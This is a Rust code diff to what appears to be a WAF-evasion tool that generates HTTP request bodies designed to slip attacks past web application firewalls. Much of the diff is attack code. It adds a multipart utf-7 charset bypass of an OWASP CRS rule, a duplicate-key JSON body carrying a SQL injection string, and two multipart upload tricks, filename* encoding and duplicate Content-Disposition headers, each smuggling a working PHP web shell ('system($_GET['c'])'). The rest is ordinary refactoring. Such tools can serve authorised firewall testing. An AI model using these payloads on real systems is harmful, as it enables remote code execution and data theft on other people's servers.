@@ -12,6 +12,14 @@
 
 use std::fmt::Write as _;
 
+/// Errors produced by content-type parsing and variant generation.
+#[derive(Debug, thiserror::Error, Clone, PartialEq, Eq)]
+pub enum ContentTypeError {
+    /// The input body exceeded the maximum allowed size for form parsing.
+    #[error("form body too large: {got} bytes exceeds cap of {cap} bytes")]
+    BodyTooLarge { got: usize, cap: usize },
+}
+
 /// A Content-Type variant with the transformed body.
 #[derive(Debug, Clone)]
 pub struct ContentTypeVariant {
@@ -48,6 +56,29 @@ pub enum ContentTypeTechnique {
     XmlCdata,
     /// Mixed Content-Type header (multipart but with JSON charset).
     MixedContentType,
+    /// CVE-2026-21876 — multipart with `charset=` on an EARLY part
+    /// (e.g. utf-7) and benign charset on the last part. OWASP CRS
+    /// 922110 iterates all `MULTIPART_PART_HEADERS`, captures each
+    /// part's charset to TX:1, overwrites on every iteration. The
+    /// chained validation sees only the LAST part's charset. Payload
+    /// (e.g. `+ADw-script+AD4-`) lives in the early part with the
+    /// exotic charset. Fixed in CRS 4.22.0 / 3.3.8.
+    MultipartCharsetEarlySection,
+    /// JSON with duplicate keys — `{"id":"safe","id":"' OR 1=1--"}`.
+    /// AWS WAF and most WAFs take FIRST (`safe`); Python json /
+    /// Node JSON.parse / Go encoding-json take LAST (the injection).
+    /// Confirmed bypass per WafCharm 2024 docs.
+    JsonDuplicateKey,
+    /// Multipart with `filename*=UTF-8''shell%2Ephp` (RFC 5987
+    /// percent-encoded). WAF inspects `filename=` and misses the
+    /// star-form; Busboy, Werkzeug, Django all decode `filename*` and
+    /// see the original `shell.php`. Sicuranext 2025.
+    MultipartFilenameStarEncoded,
+    /// Two `Content-Disposition` lines in the SAME multipart part —
+    /// first has `filename="evil.php"`, second has `filename="safe.txt"`.
+    /// WAF reads the second; PHP `$_FILES` reads the first. Sicuranext
+    /// 2025 confirmed against FortiWeb + PHP.
+    MultipartDuplicatePartHeader,
 }
 
 impl ContentTypeTechnique {
@@ -131,8 +162,14 @@ fn bound_params(params: &[(String, String)]) -> std::borrow::Cow<'_, [(String, S
         let remaining = MAX_VARIANT_INPUT_BYTES - used;
         let cost = k.len() + v.len();
         if cost > remaining {
+            // The key alone already exhausts the budget — skip entirely
+            // rather than emitting (key, "") which wastes budget and
+            // misrepresents the param with an empty value.
+            if k.len() >= remaining {
+                break;
+            }
             // Trim the value to fit the remaining budget exactly.
-            let vb = floor_char_boundary(&v, remaining.saturating_sub(k.len()));
+            let vb = floor_char_boundary(&v, remaining - k.len());
             out.push((k.clone(), v[..vb].to_string()));
             break;
         }
@@ -156,17 +193,24 @@ fn bound_params(params: &[(String, String)]) -> std::borrow::Cow<'_, [(String, S
 /// credibility audit.)
 ///
 /// **Size guarding.** Bodies larger than `MAX_FORM_BODY_SIZE` (8 MiB) are
-/// rejected (empty vector returned) to prevent memory exhaustion on
-/// adversarial inputs.
-#[must_use]
-pub fn parse_form_body(body: &[u8]) -> Vec<(String, String)> {
+/// rejected with [`ContentTypeError::BodyTooLarge`] to prevent memory
+/// exhaustion on adversarial inputs. Use [`parse_form_body_lossy`] if
+/// you need the old empty-Vec-on-oversize behaviour.
+///
+/// # Errors
+///
+/// Returns [`ContentTypeError::BodyTooLarge`] when `body.len() > MAX_FORM_BODY_SIZE`.
+pub fn parse_form_body(body: &[u8]) -> Result<Vec<(String, String)>, ContentTypeError> {
     if body.len() > MAX_FORM_BODY_SIZE {
-        return Vec::new();
+        return Err(ContentTypeError::BodyTooLarge {
+            got: body.len(),
+            cap: MAX_FORM_BODY_SIZE,
+        });
     }
     let Ok(body_str) = std::str::from_utf8(body) else {
-        return Vec::new();
+        return Ok(Vec::new());
     };
-    body_str
+    Ok(body_str
         .split('&')
         .filter_map(|pair| {
             let mut parts = pair.splitn(2, '=');
@@ -179,7 +223,21 @@ pub fn parse_form_body(body: &[u8]) -> Vec<(String, String)> {
                 Some((key, value))
             }
         })
-        .collect()
+        .collect())
+}
+
+/// Backwards-compatible wrapper around [`parse_form_body`] that returns an
+/// empty `Vec` on any error (including oversized bodies) instead of `Result`.
+///
+/// Prefer [`parse_form_body`] for new code so oversized inputs are
+/// handled explicitly.
+#[deprecated(
+    since = "0.2.22",
+    note = "Use `parse_form_body` which returns `Result` and surfaces `BodyTooLarge` explicitly"
+)]
+#[must_use]
+pub fn parse_form_body_lossy(body: &[u8]) -> Vec<(String, String)> {
+    parse_form_body(body).unwrap_or_default()
 }
 
 /// FNV-1a hash of params bytes for deterministic boundary generation.
@@ -419,7 +477,16 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
     // 5. Multipart with DUPLICATE boundary parameter (first vs last wins)
     {
         let real_boundary = unique_boundary(&value_refs);
-        let fake_boundary = unique_boundary(&value_refs);
+        // Loop until fake_boundary differs from real_boundary. unique_boundary
+        // generates 128-bit hex tails so this terminates on the first attempt
+        // with overwhelming probability — the loop is a correctness guard, not
+        // a performance concern.
+        let fake_boundary = loop {
+            let candidate = unique_boundary(&value_refs);
+            if candidate != real_boundary {
+                break candidate;
+            }
+        };
         let body = build_multipart_body(params, &real_boundary);
         variants.push(ContentTypeVariant {
             content_type: format!(
@@ -567,13 +634,164 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
         });
     }
 
+    // 11. CVE-2026-21876 — early-part charset shadowing.
+    //
+    // OWASP CRS 922110 iterates MULTIPART_PART_HEADERS, captures
+    // each part's charset to TX:1, OVERWRITES on every iteration.
+    // The chained validation rule fires once after the loop —
+    // seeing only the LAST part's charset. Place the dangerous
+    // charset (utf-7) on part[0] (which actually carries the payload)
+    // and utf-8 on the trailing dummy part. CRS sees utf-8 on TX:1
+    // at validation time, skips. Backend (PHP, Python, Node) honors
+    // each part's own charset independently.
+    {
+        let boundary = unique_boundary(&value_refs);
+        let mut body: Vec<u8> = Vec::new();
+        // Part 0 with utf-7 charset carrying the payload params.
+        for (k, v) in params {
+            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+            body.extend_from_slice(
+                format!("Content-Disposition: form-data; name=\"{k}\"\r\n").as_bytes(),
+            );
+            body.extend_from_slice(b"Content-Type: text/plain; charset=utf-7\r\n\r\n");
+            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(b"\r\n");
+        }
+        // Trailing dummy part with utf-8 charset (the one CRS sees).
+        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+        body.extend_from_slice(b"Content-Disposition: form-data; name=\"_pad\"\r\n");
+        body.extend_from_slice(b"Content-Type: text/plain; charset=utf-8\r\n\r\n");
+        body.extend_from_slice(b"x\r\n");
+        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
+        variants.push(ContentTypeVariant {
+            content_type: format!("multipart/form-data; boundary={boundary}"),
+            body,
+            technique: ContentTypeTechnique::MultipartCharsetEarlySection,
+            description:
+                "CVE-2026-21876 — early part charset (utf-7) carrying payload, benign utf-8 trailing dummy".into(),
+        });
+    }
+
+    // 12. JSON duplicate-key WAF/origin split.
+    //
+    // AWS WAF + most WAFs take FIRST; Python json / Node JSON.parse /
+    // Go encoding-json take LAST. Two entries with the same key, first
+    // benign, second the injection. We can only emit this if the params
+    // are non-empty.
+    if !params.is_empty() {
+        let (k, v) = &params[0];
+        // Construct hand-rolled JSON so the duplicate key survives —
+        // serde_json::to_string collapses duplicates.
+        //
+        // Pre-fix: `k` was interpolated raw into `{"k":...,"k":...}`.
+        // A key containing `"` or `\` (e.g. from a form field named
+        // `a"b`) produced malformed JSON — the `"` escaped the key
+        // string early, and many JSON parsers would reject or
+        // misparse the body, defeating the WAF/origin split.
+        // Fix: use `serde_json::to_string(k)` which returns the
+        // properly double-quoted, escaped form (e.g. `"a\"b"`) and
+        // interpolate that directly.
+        let key_json = serde_json::to_string(k.as_str())
+            .unwrap_or_else(|_| format!("\"{}\"", k.replace('"', "\\\"")));
+        let body = format!(
+            "{{{key_json}:\"safe\",{key_json}:{value}}}",
+            value = serde_json::to_string(v).unwrap_or_else(|_| format!("\"{}\"", v.replace('"', "\\\"")))
+        )
+        .into_bytes();
+        variants.push(ContentTypeVariant {
+            content_type: "application/json".into(),
+            body,
+            technique: ContentTypeTechnique::JsonDuplicateKey,
+            description:
+                "Duplicate JSON key — WAF takes first (safe), backend takes last (injection)".into(),
+        });
+    }
+
+    // 13. Multipart filename* RFC 5987 percent-encoded.
+    //
+    // WAF inspects `filename=` literal; Busboy / Werkzeug / Django
+    // decode `filename*=UTF-8''shell%2Ephp` and see the real name.
+    // The upload part precedes the standard form fields so that the
+    // form-data structure is otherwise normal.
+    {
+        let boundary = unique_boundary(&value_refs);
+        let mut body: Vec<u8> = Vec::new();
+        // First: the malicious upload part with star-encoded filename.
+        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+        body.extend_from_slice(
+            b"Content-Disposition: form-data; name=\"upload\"; filename*=UTF-8''shell%2Ephp\r\n",
+        );
+        body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
+        body.extend_from_slice(b"<?php system($_GET['c']); ?>\r\n");
+        // Then: the standard form params so the multipart structure
+        // contains the input fields the bench harness checks for.
+        for (k, v) in params {
+            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+            body.extend_from_slice(
+                format!("Content-Disposition: form-data; name=\"{k}\"\r\n\r\n").as_bytes(),
+            );
+            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(b"\r\n");
+        }
+        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
+        variants.push(ContentTypeVariant {
+            content_type: format!("multipart/form-data; boundary={boundary}"),
+            body,
+            technique: ContentTypeTechnique::MultipartFilenameStarEncoded,
+            description:
+                "RFC 5987 filename* with percent-encoded dot — WAF inspects filename= only".into(),
+        });
+    }
+
+    // 14. Duplicate Content-Disposition headers in the SAME part.
+    //
+    // WAF reads the second header; PHP $_FILES reads the first.
+    // First says `filename="evil.php"` (the real file), second says
+    // `filename="safe.txt"` (the cover the WAF sees). Standard form
+    // params follow so the multipart's form-data fields are present.
+    {
+        let boundary = unique_boundary(&value_refs);
+        let mut body: Vec<u8> = Vec::new();
+        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+        body.extend_from_slice(
+            b"Content-Disposition: form-data; name=\"upload\"; filename=\"evil.php\"\r\n",
+        );
+        body.extend_from_slice(
+            b"Content-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"\r\n",
+        );
+        body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
+        body.extend_from_slice(b"<?php system($_GET['c']); ?>\r\n");
+        for (k, v) in params {
+            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+            body.extend_from_slice(
+                format!("Content-Disposition: form-data; name=\"{k}\"\r\n\r\n").as_bytes(),
+            );
+            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(b"\r\n");
+        }
+        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
+        variants.push(ContentTypeVariant {
+            content_type: format!("multipart/form-data; boundary={boundary}"),
+            body,
+            technique: ContentTypeTechnique::MultipartDuplicatePartHeader,
+            description:
+                "Duplicate Content-Disposition — first wins (PHP $_FILES), WAF reads second".into(),
+        });
+    }
+
     variants
 }
 
 /// Generate Content-Type variants from a raw form-encoded body.
+///
+/// Returns an empty `Vec` if the body is not valid form-encoded data,
+/// is too large, or contains no parseable key-value pairs.
 #[must_use]
 pub fn generate_variants_from_body(body: &[u8]) -> Vec<ContentTypeVariant> {
-    let params = parse_form_body(body);
+    let params = match parse_form_body(body) {
+        Ok(p) => p,
+        Err(_) => return Vec::new(),
+    };
     if params.is_empty() {
         return Vec::new();
     }
